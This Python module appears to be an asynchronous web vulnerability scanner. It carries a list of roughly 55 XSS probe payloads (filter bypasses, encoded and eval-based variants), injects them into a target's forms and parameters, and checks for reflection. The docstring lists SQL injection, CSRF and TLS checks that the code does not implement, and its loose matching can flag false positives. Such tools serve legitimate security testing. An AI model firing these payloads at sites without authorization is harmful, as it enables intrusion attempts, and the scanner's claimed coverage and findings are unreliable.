"""
VulnerabilityScanner - An asynchronous web application security scanner

This module provides a comprehensive vulnerability scanning solution with support for:
- XSS (Cross-Site Scripting)
- SQL Injection
- CSRF (Cross-Site Request Forgery)
- Security Headers
- SSL/TLS Configuration
- Broken Access Control

Usage:
    scanner = VulnerabilityScanner(url="https://example.com")
    async with scanner:
        results = await scanner.scan()
"""

from typing import Dict, List, Optional, Any, Tuple
import aiohttp
import asyncio
import logging
from colorama import Fore, Style, init
import sys
import traceback
import urllib.parse
from bs4 import BeautifulSoup
import uuid
import time
import os
import psutil
import threading
import random
import atexit
import re
from aiohttp import ClientSession, ClientError
import ssl
import socket
from urllib.parse import urlparse
import json
from datetime import datetime as dt
from datetime import timezone
from models import db

# Initialize colorama for cross-platform color support
init()

# Set up logging with file output
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('scanner.log'),
        logging.StreamHandler(sys.stdout)
    ]
)
logger = logging.getLogger(__name__)

class SessionManager:
    def __init__(self):
        self.session = None
        self._lock = asyncio.Lock()
        self.logger = logging.getLogger("vulnscan")
        
    async def __aenter__(self):
        if not self.session:
            self.session = aiohttp.ClientSession()
        return self.session
        
    async def __aexit__(self, exc_type, exc_val, exc_tb):
        if self.session:
            await self.session.close()
            self.session = None
            
    async def get_session(self):
        async with self._lock:
            if not self.session:
                self.session = aiohttp.ClientSession()
            return self.session
            
    async def cleanup(self):
        """Cleanup session resources"""
        if self.session and not self.session.closed:
            await self.session.close()
            self.session = None
        self.logger.info("Cleanup completed")

class RateLimiter:
    def __init__(self, requests_per_second, burst_size):
        self.requests_per_second = requests_per_second
        self.burst_size = burst_size
        self.tokens = burst_size
        self.last_update = time.monotonic()
        self._lock = asyncio.Lock()
        self._waiting = 0

    async def acquire(self):
        """Improved rate limiting with queue tracking"""
        async with self._lock:
            now = time.monotonic()
            time_passed = now - self.last_update
            self.tokens = min(
                self.burst_size,
                self.tokens + time_passed * self.requests_per_second
            )
            
            self._waiting += 1
            try:
                if self.tokens < 1:
                    wait_time = (1 - self.tokens) / self.requests_per_second
                    # Add jitter to prevent thundering herd
                    wait_time += random.uniform(0, 0.1)
                    await asyncio.sleep(wait_time)
                    self.tokens = 1
                
                self.tokens -= 1
                self.last_update = now
            finally:
                self._waiting -= 1

class BaseScanner:
    """Base scanner class with common functionality"""
    
    def __init__(self, url, session=None):
        self.url = url if url.startswith(('http://', 'https://')) else f'http://{url}'
        self.session = session
        self.logger = logging.getLogger(self.__class__.__name__)
        self.vulnerabilities = []
        self.requests_made = 0
        self.max_retries = 3
        self.retry_delay = 1
        self.timeout = aiohttp.ClientTimeout(total=10)
        
    async def make_request(self, url, method='GET', data=None, headers=None, verify_ssl=False):
        """Make an HTTP request with retry logic"""
        if not headers:
            headers = {}
            
        for attempt in range(self.max_retries):
            try:
                async with self.session.request(
                    method, 
                    url, 
                    data=data, 
                    headers=headers,
                    ssl=verify_ssl,
                    timeout=self.timeout
                ) as response:
                    self.requests_made += 1
                    content = await response.text()
                    return content, response.headers, response.status
                    
            except Exception as e:
                if attempt == self.max_retries - 1:
                    raise
                await asyncio.sleep(self.retry_delay * (attempt + 1))
                
    def add_vulnerability(self, vulnerability_type, description, severity="Medium", evidence=None):
        """Add a vulnerability finding"""
        evidence_dict = evidence or {}
        vuln = {
            'type': vulnerability_type,
            'description': description,
            'severity': severity,
            'evidence': json.dumps(evidence_dict),  # Serialize evidence to JSON
            'timestamp': dt.now(timezone.utc).isoformat()
        }
        self.vulnerabilities.append(vuln)
        return vuln
        
    async def scan(self):
        """Base scan method to be implemented by subclasses"""
        return await self._scan()
        
    async def _scan(self):
        """Internal scan method to be implemented by subclasses"""
        raise NotImplementedError("Subclasses must implement _scan method")

class XSSScanner(BaseScanner):
    def __init__(self, url, session=None):
        super().__init__(url, session)
        self.xss_payloads = [
            # Basic Script Injection
            '<script>alert(1)</script>',
            '"><script>alert(1)</script>',
            "'><script>alert(1)</script>",
            '</script><script>alert(1)</script>',
            
            # Event Handler Injections
            '" onmouseover="alert(1)"',
            "' onmouseover='alert(1)'",
            '" onload="alert(1)"',
            "' onload='alert(1)'",
            '" onerror="alert(1)"',
            "' onerror='alert(1)'",
            '" onfocus="alert(1)"',
            "' onfocus='alert(1)'",
            
            # HTML Tag Injections
            '<img src=x onerror=alert(1)>',
            '"><img src=x onerror=alert(1)>',
            "'><img src=x onerror=alert(1)>",
            '<svg onload=alert(1)>',
            '"><svg onload=alert(1)>',
            "'><svg onload=alert(1)>",
            
            # JavaScript Protocol
            'javascript:alert(1)',
            'javascript:alert(1)//',
            'javascript:alert(1);//',
            
            # Encoded Payloads
            '&lt;script&gt;alert(1)&lt;/script&gt;',
            '%3Cscript%3Ealert(1)%3C/script%3E',
            '&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;',
            
            # Template Literal
            '`<script>alert(1)</script>`',
            '"><script>alert`1`</script>',
            "'><script>alert`1`</script>",
            
            # DOM-based XSS
            '"><img src=x id="x" onerror="(()=>{alert(1)})()">', 
            '"><script>(()=>{alert(1)})()</script>',
            
            # Exotic Payloads
            '<details open ontoggle=alert(1)>',
            '<body onpageshow=alert(1)>',
            '<input autofocus onfocus=alert(1)>',
            '<video src=x onerror=alert(1)>',
            '<audio src=x onerror=alert(1)>',
            
            # Bypass Attempts
            '<scr<script>ipt>alert(1)</scr</script>ipt>',
            '<script>al\u0065rt(1)</script>',
            '<scr\x00ipt>alert(1)</scr\x00ipt>',
            '"><script>document.write(String.fromCharCode(60,115,99,114,105,112,116,62,97,108,101,114,116,40,49,41,60,47,115,99,114,105,112,116,62))</script>',
            
            # Mixed Context
            '\'/><script>alert(1)</script><input value=\'',
            '`/><script>alert(1)</script><input value=`',
            
            # SVG Context
            '<svg><script>alert(1)</script></svg>',
            '<svg><animate onbegin=alert(1) attributeName=x dur=1s>',
            '<svg><set attributeName=onmouseover value=alert(1)>',
            
            # CSS Context
            '<style>@import "data:,alert(1)";</style>',
            '"><style>*{background-image:url("javascript:alert(1)")}</style>',
            
            # Meta Refresh
            '<meta http-equiv="refresh" content="0;url=javascript:alert(1)">',
            
            # Base Tag
            '<base href="javascript:alert(1);//">',
            
            # Link Tag
            '<link rel="import" href="data:text/html,<script>alert(1)</script>">',
            
            # Unicode Escapes
            '<script>\u0061\u006C\u0065\u0072\u0074(1)</script>',
            
            # HTML5 Elements
            '<details ontoggle="alert(1)" open>',
            '<marquee onstart=alert(1)>',
            '<meter onmouseover=alert(1)>',
            '<object data="data:text/html,<script>alert(1)</script>">',
            
            # Recursive Payloads
            '"><script>eval(atob("YWxlcnQoMSk="))</script>',
            '"><img src=x onerror="eval(atob(\'YWxlcnQoMSk=\'))">'
        ]
        
    async def find_input_points(self, url):
        input_points = []
        try:
            async with self.session.get(url, verify_ssl=False) as response:
                content = await response.text()
                soup = BeautifulSoup(content, 'html.parser')
                
                # URL Parameters
                parsed_url = urlparse(url)
                if parsed_url.query:
                    params = urllib.parse.parse_qs(parsed_url.query)
                    for param in params:
                        input_points.append(('url_param', param))
                
                # Form Inputs
                forms = soup.find_all('form')
                for form in forms:
                    method = form.get('method', 'get').lower()
                    action = form.get('action', '')
                    if not action:
                        action = url
                    elif not action.startswith(('http://', 'https://')):
                        base_url = f"{parsed_url.scheme}://{parsed_url.netloc}"
                        action = urllib.parse.urljoin(base_url, action)
                    
                    # Get all input elements
                    inputs = form.find_all(['input', 'textarea', 'select'])
                    for input_elem in inputs:
                        input_name = input_elem.get('name', '')
                        if input_name:
                            input_points.append(('form', {
                                'method': method,
                                'action': action,
                                'name': input_name,
                                'type': input_elem.get('type', 'text')
                            }))
                
                # Links with Parameters
                links = soup.find_all('a', href=True)
                for link in links:
                    href = link['href']
                    if not href.startswith(('http://', 'https://')):
                        href = urllib.parse.urljoin(url, href)
                    parsed_link = urlparse(href)
                    if parsed_link.query:
                        params = urllib.parse.parse_qs(parsed_link.query)
                        for param in params:
                            input_points.append(('link_param', {
                                'url': href,
                                'param': param
                            }))
                
                # HTML Attributes
                all_elements = soup.find_all()
                for element in all_elements:
                    for attr, value in element.attrs.items():
                        if isinstance(value, str) and value.strip():
                            input_points.append(('attribute', {
                                'tag': element.name,
                                'attribute': attr,
                                'value': value
                            }))
                
                # JavaScript Event Handlers
                event_handlers = [
                    'onclick', 'onmouseover', 'onmouseout', 'onload', 'onerror',
                    'onsubmit', 'onchange', 'onfocus', 'onblur', 'onkeyup',
                    'onkeydown', 'onkeypress'
                ]
                for element in all_elements:
                    for handler in event_handlers:
                        if element.has_attr(handler):
                            input_points.append(('event_handler', {
                                'tag': element.name,
                                'handler': handler,
                                'value': element[handler]
                            }))
                
                # Custom Data Attributes
                for element in all_elements:
                    for attr in element.attrs:
                        if attr.startswith('data-'):
                            input_points.append(('data_attribute', {
                                'tag': element.name,
                                'attribute': attr,
                                'value': element[attr]
                            }))
                
        except Exception as e:
            self.logger.error(f"Error finding input points: {str(e)}")
        
        return input_points

    async def test_input_point(self, input_type, input_point, payload):
        try:
            if input_type == 'url_param':
                # Test URL parameters
                parsed_url = urlparse(self.url)
                params = dict(urllib.parse.parse_qsl(parsed_url.query))
                params[input_point] = payload
                query = urllib.parse.urlencode(params)
                test_url = parsed_url._replace(query=query).geturl()
                
                async with self.session.get(test_url, verify_ssl=False) as response:
                    content = await response.text()
                    if await self.check_payload_reflection(content, payload):
                        self.add_vulnerability(
                            "XSS",
                            f"XSS vulnerability found in URL parameter '{input_point}'",
                            "High",
                            {"url": test_url, "payload": payload}
                        )
            
            elif input_type == 'form':
                # Test form inputs
                method = input_point['method']
                action = input_point['action']
                data = {input_point['name']: payload}
                
                if method == 'get':
                    params = urllib.parse.urlencode(data)
                    test_url = f"{action}?{params}"
                    async with self.session.get(test_url, verify_ssl=False) as response:
                        content = await response.text()
                else:  # POST
                    async with self.session.post(action, data=data, verify_ssl=False) as response:
                        content = await response.text()
                
                if await self.check_payload_reflection(content, payload):
                    self.add_vulnerability(
                        "XSS",
                        f"XSS vulnerability found in form input '{input_point['name']}'",
                        "High",
                        {"form_action": action, "method": method, "payload": payload}
                    )
            
            elif input_type == 'link_param':
                # Test link parameters
                parsed_url = urlparse(input_point['url'])
                params = dict(urllib.parse.parse_qsl(parsed_url.query))
                params[input_point['param']] = payload
                query = urllib.parse.urlencode(params)
                test_url = parsed_url._replace(query=query).geturl()
                
                async with self.session.get(test_url, verify_ssl=False) as response:
                    content = await response.text()
                    if await self.check_payload_reflection(content, payload):
                        self.add_vulnerability(
                            "XSS",
                            f"XSS vulnerability found in link parameter '{input_point['param']}'",
                            "High",
                            {"url": test_url, "payload": payload}
                        )
            
            elif input_type in ['attribute', 'event_handler', 'data_attribute']:
                # For these types, we need to check if the payload appears in the context where it could be executed
                async with self.session.get(self.url, verify_ssl=False) as response:
                    content = await response.text()
                    if await self.check_payload_reflection(content, payload):
                        self.add_vulnerability(
                            "XSS",
                            f"Potential XSS vulnerability found in {input_type}",
                            "Medium",
                            {"element": input_point['tag'], "attribute": input_point.get('attribute', input_point.get('handler')), "payload": payload}
                        )
                        
        except Exception as e:
            self.logger.error(f"Error testing input point: {str(e)}")

    async def check_payload_reflection(self, content, payload):
        # Check for exact payload match
        if payload in content:
            return True
            
        # Check for URL-decoded payload
        url_decoded = urllib.parse.unquote(payload)
        if url_decoded in content:
            return True
            
        # Check for HTML-decoded payload
        html_decoded = BeautifulSoup(content, 'html.parser').get_text()
        if payload in html_decoded:
            return True
            
        # Check for payload in script tags
        soup = BeautifulSoup(content, 'html.parser')
        scripts = soup.find_all('script')
        for script in scripts:
            if payload in str(script):
                return True
                
        # Check for payload in event handlers
        for tag in soup.find_all():
            for attr in tag.attrs:
                if attr.startswith('on') and payload in str(tag[attr]):
                    return True
                    
        # Check for case-insensitive matches
        if payload.lower() in content.lower():
            return True
            
        return False

    async def _scan(self):
        self.logger.info(f"Starting XSS scan for {self.url}")
        
        # Find all input points
        input_points = await self.find_input_points(self.url)
        self.logger.info(f"Found {len(input_points)} potential input points")
        
        # Test each input point with each payload
        for input_type, input_point in input_points:
            self.logger.info(f"Testing input point: {input_type} - {input_point}")
            for payload in self.xss_payloads:
                self.logger.debug(f"Testing payload: {payload}")
                await self.test_input_point(input_type, input_point, payload)
                
        self.logger.info("XSS scan completed")

class VulnerabilityScanner:
    def __init__(self, url):
        self.url = url
        self.session = None
        self.xss_scanner = None
        self.logger = logging.getLogger(self.__class__.__name__)
        self.vulnerabilities = []
        
    async def __aenter__(self):
        await self.initialize()
        return self
        
    async def __aexit__(self, exc_type, exc_val, exc_tb):
        await self.cleanup()
        
    async def initialize(self):
        """Initialize the scanner and its components"""
        if not self.session:
            self.session = aiohttp.ClientSession()
        if not self.xss_scanner:
            self.xss_scanner = XSSScanner(self.url, self.session)
        
    async def cleanup(self):
        """Cleanup resources"""
        if self.session:
            await self.session.close()
            self.session = None
            
    async def scan(self, checks=None):
        """
        Run security scans based on specified checks
        
        Args:
            checks (list): List of security checks to run. If None, runs all checks.
        """
        try:
            self.logger.info(f"Starting security scan for {self.url}")
            
            # Initialize scanner components
            await self.initialize()
            
            if not checks:
                checks = ['xss']  # Default to XSS scan if no checks specified
                
            # Run XSS scan if specified
            if 'xss' in checks:
                self.logger.info("Starting XSS scan")
                await self.xss_scanner._scan()
                self.vulnerabilities.extend(self.xss_scanner.vulnerabilities)
            
            # Log results
            if self.vulnerabilities:
                self.logger.info(f"Found {len(self.vulnerabilities)} vulnerabilities")
                for vuln in self.vulnerabilities:
                    self.logger.info(f"- {vuln['type']}: {vuln['description']} (Severity: {vuln['severity']})")
            else:
                self.logger.info("No vulnerabilities found")
                
            return {
                'url': self.url,
                'vulnerabilities': self.vulnerabilities,
                'scan_time': dt.now(timezone.utc).isoformat(),
                'total_vulnerabilities': len(self.vulnerabilities),
                'status': 'completed',
                'metrics': {
                    'total_requests': self.xss_scanner.requests_made if self.xss_scanner else 0,
                    'checks_performed': checks
                }
            }
            
        except Exception as e:
            self.logger.error(f"Error during security scan: {str(e)}")
            traceback.print_exc()
            return {
                'url': self.url,
                'vulnerabilities': [],
                'scan_time': dt.now(timezone.utc).isoformat(),
                'total_vulnerabilities': 0,
                'status': 'error',
                'error': str(e),
                'metrics': {
                    'total_requests': self.xss_scanner.requests_made if self.xss_scanner else 0,
                    'checks_performed': checks
                }
            }
        finally:
            # Cleanup resources
            await self.cleanup()
